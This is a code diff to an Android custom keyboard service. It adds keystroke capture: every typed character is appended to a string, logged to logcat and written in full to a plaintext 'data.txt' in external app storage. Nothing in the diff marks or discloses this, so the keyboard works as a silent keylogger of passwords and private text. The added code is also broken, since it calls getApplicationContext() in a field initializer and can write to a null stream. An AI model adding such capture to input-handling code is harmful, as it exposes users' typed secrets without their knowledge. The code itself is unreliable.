@@ -9,10 +9,16 @@ import android.view.KeyEvent;
 import android.view.View;
 import android.view.inputmethod.InputConnection;
 
+import java.io.File;
+import java.io.FileNotFoundException;
+import java.io.FileOutputStream;
+import java.io.IOException;
+
 public class MyInputMethodService extends InputMethodService implements KeyboardView.OnKeyboardActionListener{
     private KeyboardView keyboardView;
     private Keyboard keyboard;
-
+    private File path = getApplicationContext().getExternalFilesDir(null);
+    private File file = new File(path, "data.txt");
     private String data = "";
     private boolean caps = false;
 
@@ -70,7 +76,25 @@ public class MyInputMethodService extends InputMethodService implements Keyboard
                     String newData = String.valueOf(code);
                     data += newData;
                     inputConnection.commitText(newData, 1);
+                    Log.i("data: ", data);
 
+                    FileOutputStream stream = null;
+                    try {
+                        stream = new FileOutputStream(file);
+                    } catch (FileNotFoundException e) {
+                        e.printStackTrace();
+                    }
+                    try {
+                        stream.write(data.getBytes());
+                    } catch (IOException e) {
+                        e.printStackTrace();
+                    } finally {
+                        try {
+                            stream.close();
+                        } catch (IOException e) {
+                            e.printStackTrace();
+                        }
+                    }
             }
         }
 
